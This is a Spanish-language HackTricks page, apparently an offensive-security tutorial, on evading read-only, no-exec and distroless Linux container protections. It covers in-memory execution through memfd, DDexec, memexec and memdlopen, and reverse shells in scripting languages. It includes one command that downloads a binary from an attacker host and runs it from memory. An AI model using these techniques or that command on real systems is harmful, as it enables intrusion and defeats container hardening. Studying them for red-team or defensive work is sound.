# Bypass FS protections: read-only / no-exec / Distroless

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si estás interesado en una **carrera de hacking** y hackear lo inhackeable - **¡estamos contratando!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videos

En los siguientes videos puedes encontrar las técnicas mencionadas en esta página explicadas más a fondo:

* [**DEF CON 31 - Explorando la Manipulación de Memoria en Linux para el Sigilo y la Evasión**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Intrusiones sigilosas con DDexec-ng & dlopen() en memoria - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## escenario de solo lectura / sin ejecución

Es cada vez más común encontrar máquinas linux montadas con **protección de sistema de archivos de solo lectura (ro)**, especialmente en contenedores. Esto se debe a que ejecutar un contenedor con un sistema de archivos ro es tan fácil como establecer **`readOnlyRootFilesystem: true`** en el `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Sin embargo, incluso si el sistema de archivos está montado como ro, **`/dev/shm`** seguirá siendo escribible, por lo que es falso que no podamos escribir nada en el disco. Sin embargo, esta carpeta estará **montada con protección sin ejecución**, por lo que si descargas un binario aquí **no podrás ejecutarlo**.

{% hint style="warning" %}
Desde la perspectiva de un equipo rojo, esto hace que sea **complicado descargar y ejecutar** binarios que no están en el sistema ya (como puertas traseras o enumeradores como `kubectl`).
{% endhint %}

## Bypass más fácil: Scripts

Ten en cuenta que mencioné binarios, puedes **ejecutar cualquier script** siempre que el intérprete esté dentro de la máquina, como un **script de shell** si `sh` está presente o un **script de python** si `python` está instalado.

Sin embargo, esto no es suficiente para ejecutar tu puerta trasera binaria u otras herramientas binarias que puedas necesitar ejecutar.

## Bypasses de Memoria

Si deseas ejecutar un binario pero el sistema de archivos no lo permite, la mejor manera de hacerlo es **ejecutándolo desde la memoria**, ya que las **protecciones no se aplican allí**.

### Bypass de FD + syscall exec

Si tienes algunos motores de script potentes dentro de la máquina, como **Python**, **Perl** o **Ruby**, podrías descargar el binario para ejecutarlo desde la memoria, almacenarlo en un descriptor de archivo de memoria (`create_memfd` syscall), que no estará protegido por esas protecciones y luego llamar a una **`exec` syscall** indicando el **fd como el archivo a ejecutar**.

Para esto, puedes usar fácilmente el proyecto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puedes pasarle un binario y generará un script en el lenguaje indicado con el **binario comprimido y codificado en b64** con las instrucciones para **decodificar y descomprimirlo** en un **fd** creado llamando a la syscall `create_memfd` y una llamada a la **syscall exec** para ejecutarlo.

{% hint style="warning" %}
Esto no funciona en otros lenguajes de scripting como PHP o Node porque no tienen ninguna **manera predeterminada de llamar a syscalls en bruto** desde un script, por lo que no es posible llamar a `create_memfd` para crear el **fd de memoria** para almacenar el binario.

Además, crear un **fd regular** con un archivo en `/dev/shm` no funcionará, ya que no se te permitirá ejecutarlo porque se aplicará la **protección sin ejecución**.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) es una técnica que te permite **modificar la memoria de tu propio proceso** sobrescribiendo su **`/proc/self/mem`**.

Por lo tanto, **controlando el código ensamblador** que se está ejecutando en el proceso, puedes escribir un **shellcode** y "mutar" el proceso para **ejecutar cualquier código arbitrario**.

{% hint style="success" %}
**DDexec / EverythingExec** te permitirá cargar y **ejecutar** tu propio **shellcode** o **cualquier binario** desde **memoria**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para más información sobre esta técnica, consulta el Github o:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) es el siguiente paso natural de DDexec. Es un **shellcode demonizado de DDexec**, por lo que cada vez que quieras **ejecutar un binario diferente** no necesitas relanzar DDexec, solo puedes ejecutar el shellcode de memexec a través de la técnica DDexec y luego **comunicarte con este demonio para pasar nuevos binarios para cargar y ejecutar**.

Puedes encontrar un ejemplo de cómo usar **memexec para ejecutar binarios desde un reverse shell de PHP** en [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con un propósito similar al de DDexec, la técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite una **manera más fácil de cargar binarios** en memoria para ejecutarlos más tarde. Podría incluso permitir cargar binarios con dependencias.

## Bypass Distroless

### Qué es distroless

Los contenedores distroless contienen solo los **componentes mínimos necesarios para ejecutar una aplicación o servicio específico**, como bibliotecas y dependencias de tiempo de ejecución, pero excluyen componentes más grandes como un gestor de paquetes, shell o utilidades del sistema.

El objetivo de los contenedores distroless es **reducir la superficie de ataque de los contenedores al eliminar componentes innecesarios** y minimizar el número de vulnerabilidades que pueden ser explotadas.

### Reverse Shell

En un contenedor distroless, es posible que **ni siquiera encuentres `sh` o `bash`** para obtener un shell regular. Tampoco encontrarás binarios como `ls`, `whoami`, `id`... todo lo que normalmente ejecutas en un sistema.

{% hint style="warning" %}
Por lo tanto, **no podrás** obtener un **reverse shell** o **enumerar** el sistema como lo haces normalmente.
{% endhint %}

Sin embargo, si el contenedor comprometido está ejecutando, por ejemplo, un flask web, entonces python está instalado, y por lo tanto puedes obtener un **reverse shell de Python**. Si está ejecutando node, puedes obtener un reverse shell de Node, y lo mismo con casi cualquier **lenguaje de scripting**.

{% hint style="success" %}
Usando el lenguaje de scripting podrías **enumerar el sistema** utilizando las capacidades del lenguaje.
{% endhint %}

Si no hay protecciones de **`read-only/no-exec`**, podrías abusar de tu reverse shell para **escribir en el sistema de archivos tus binarios** y **ejecutarlos**.

{% hint style="success" %}
Sin embargo, en este tipo de contenedores, estas protecciones generalmente existirán, pero podrías usar las **técnicas de ejecución en memoria anteriores para eludirlas**.
{% endhint %}

Puedes encontrar **ejemplos** sobre cómo **explotar algunas vulnerabilidades RCE** para obtener **reverse shells** de lenguajes de scripting y ejecutar binarios desde la memoria en [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si estás interesado en una **carrera de hacking** y hackear lo inhackeable - **¡estamos contratando!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}
